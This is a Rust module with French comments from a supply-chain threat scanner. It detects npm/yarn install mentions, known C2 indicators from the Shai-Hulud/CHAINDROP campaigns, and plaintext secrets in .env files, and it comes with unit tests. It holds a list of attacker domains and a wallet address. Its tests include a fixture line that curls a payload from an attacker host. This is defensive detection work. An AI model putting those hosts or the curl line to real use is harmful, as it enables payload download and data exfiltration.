//! Détection passive dans le code source : instructions d'installation directes
//! (SPEC-F05), marqueurs C2 connus des campagnes Shai-Hulud / CHAINDROP (SPEC-F08) et
//! secrets en clair dans les fichiers `.env*` du workspace (SPEC-F08).

use std::path::{Path, PathBuf};
use std::sync::LazyLock;

use indicatif::ProgressBar;
use regex::Regex;

use crate::hunt::{ThreatCategory, ThreatSignal};

static NPM_INSTALL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"npm\s(install|ci|update)").unwrap());
static YARN_INSTALL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"yarn\s(install|add|ci|upgrade|run)").unwrap());

/// Vrai si `content` contient une instruction d'installation npm ou yarn directe.
pub fn contains_install_command(content: &str) -> bool {
    NPM_INSTALL.is_match(content) || YARN_INSTALL.is_match(content)
}

/// Marqueurs C2 connus des campagnes Shai-Hulud / CHAINDROP (SPEC-F08, source :
/// Elastic Security Labs et vagues précédentes — Datadog, JFrog).
pub const KNOWN_C2_MARKERS: &[&str] = &[
    "npm-cache.com",
    "js-mirror.com",
    "pypi-get.com",
    "awqhnjewqjkl.icu",
    "SANDWORM",
    "official334",
    "webhook.site",
    "0xE1f2395ee43e45A1556EC6438a88c31B83493103",
];

/// Retourne les marqueurs C2 connus présents dans `content`.
pub fn find_known_c2_markers(content: &str) -> Vec<&'static str> {
    KNOWN_C2_MARKERS
        .iter()
        .copied()
        .filter(|marker| content.contains(marker))
        .collect()
}

/// Extensions volontairement exclues du scan passif (SPEC-F05) : code déjà couvert
/// par des vérifications plus ciblées (IOC de dépendances SPEC-F04, empreintes
/// SHA-256 SPEC-F08), CSS, images et autres binaires.
const EXCLUDED_EXTENSIONS: &[&str] = &[
    "js", "mjs", "cjs", "json", "css", "png", "jpg", "jpeg", "gif", "svg", "ico", "webp", "woff",
    "woff2", "ttf", "eot", "pdf", "zip", "gz", "tar",
];

fn is_excluded(path: &Path) -> bool {
    path.extension()
        .and_then(|ext| ext.to_str())
        .is_some_and(|ext| EXCLUDED_EXTENSIONS.contains(&ext.to_ascii_lowercase().as_str()))
}

fn is_dotenv_file(path: &Path) -> bool {
    path.file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| name.starts_with(".env"))
}

/// Vrai si `content` (contenu d'un fichier `.env*`) porte au moins une assignation
/// `CLE=valeur` en clair (SPEC-F08) — les valeurs interpolées via `${VAR}` restent
/// sûres et ne sont pas comptées.
fn has_literal_dotenv_secret(content: &str) -> bool {
    content.lines().any(|line| {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            return false;
        }
        let Some((_, value)) = trimmed.split_once('=') else {
            return false;
        };
        let value = value.trim().trim_matches('"').trim_matches('\'');
        !value.is_empty() && !value.starts_with("${")
    })
}

/// Scanne tous les fichiers du workspace, **dotfiles inclus** (hors extensions
/// exclues, SPEC-F05 — l'inclusion des fichiers cachés est nécessaire pour voir les
/// `.env*`, normalement élagués par le parcours standard, SPEC-F08) à la recherche de
/// marqueurs C2 connus (SPEC-F08), de fichiers `.env*` porteurs de secrets en clair
/// (SPEC-F08, tous deux retournés comme `ThreatSignal` directement exploitables) et
/// d'instructions d'installation directes mentionnées (SPEC-F05, simple indice
/// contextuel — souvent bénin, ex. un README — retourné séparément, pas un
/// `ThreatSignal`).
pub fn scan_workspace(workspace_root: &Path) -> (Vec<ThreatSignal>, Vec<PathBuf>) {
    let progress = ProgressBar::hidden();
    let mut threat_signals = Vec::new();
    let mut install_mentions = Vec::new();

    for entry in crate::walker::walk_including_hidden(workspace_root, &progress) {
        let path = entry.path();
        if !entry.file_type().is_some_and(|ft| ft.is_file()) || is_excluded(path) {
            continue;
        }
        let Ok(content) = std::fs::read_to_string(path) else {
            continue;
        };

        if contains_install_command(&content) {
            install_mentions.push(path.to_path_buf());
        }

        let markers = find_known_c2_markers(&content);
        if !markers.is_empty() {
            threat_signals.push(ThreatSignal {
                category: ThreatCategory::KnownC2Marker,
                detail: format!("marqueur(s) C2 connu(s) : {}", markers.join(", ")),
                path: path.to_path_buf(),
            });
        }

        if is_dotenv_file(path) && has_literal_dotenv_secret(&content) {
            threat_signals.push(ThreatSignal {
                category: ThreatCategory::ExposedSecret,
                detail: "fichier .env avec valeur(s) en clair détecté dans le workspace"
                    .to_string(),
                path: path.to_path_buf(),
            });
        }
    }

    (threat_signals, install_mentions)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_npm_and_yarn_install() {
        assert!(contains_install_command("run `npm install` first"));
        assert!(contains_install_command("then yarn add lodash"));
        assert!(!contains_install_command("just some readme text"));
    }

    #[test]
    fn finds_known_c2_markers() {
        assert_eq!(
            find_known_c2_markers("callback to https://npm-cache.com/x"),
            vec!["npm-cache.com"]
        );
        assert!(find_known_c2_markers("nothing suspicious here").is_empty());
    }

    #[test]
    fn scan_workspace_separates_c2_signals_from_install_mentions() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("README.md"), "Run `npm install` to start.").unwrap();
        std::fs::write(
            dir.path().join("deploy.sh"),
            "curl https://npm-cache.com/payload",
        )
        .unwrap();
        // Exclu par extension : ne doit jamais être remonté même s'il contient un marqueur.
        std::fs::write(
            dir.path().join("bundle.min.js"),
            "webhook.site/leaked-secret",
        )
        .unwrap();

        let (threat_signals, install_mentions) = scan_workspace(dir.path());

        assert_eq!(threat_signals.len(), 1);
        assert_eq!(threat_signals[0].category, ThreatCategory::KnownC2Marker);
        assert!(threat_signals[0].path.ends_with("deploy.sh"));

        assert_eq!(install_mentions.len(), 1);
        assert!(install_mentions[0].ends_with("README.md"));
    }

    #[test]
    fn detects_a_literal_secret_in_a_dotenv_file() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".env.production"),
            "# comment\nAPI_TOKEN=sk_live_abcdef123456\n",
        )
        .unwrap();

        let (threat_signals, _) = scan_workspace(dir.path());

        assert_eq!(threat_signals.len(), 1);
        assert_eq!(threat_signals[0].category, ThreatCategory::ExposedSecret);
        assert!(threat_signals[0].path.ends_with(".env.production"));
    }

    #[test]
    fn ignores_a_dotenv_file_with_only_env_interpolated_values() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".env"), "API_TOKEN=${API_TOKEN}\n").unwrap();

        let (threat_signals, _) = scan_workspace(dir.path());
        assert!(threat_signals.is_empty());
    }
}
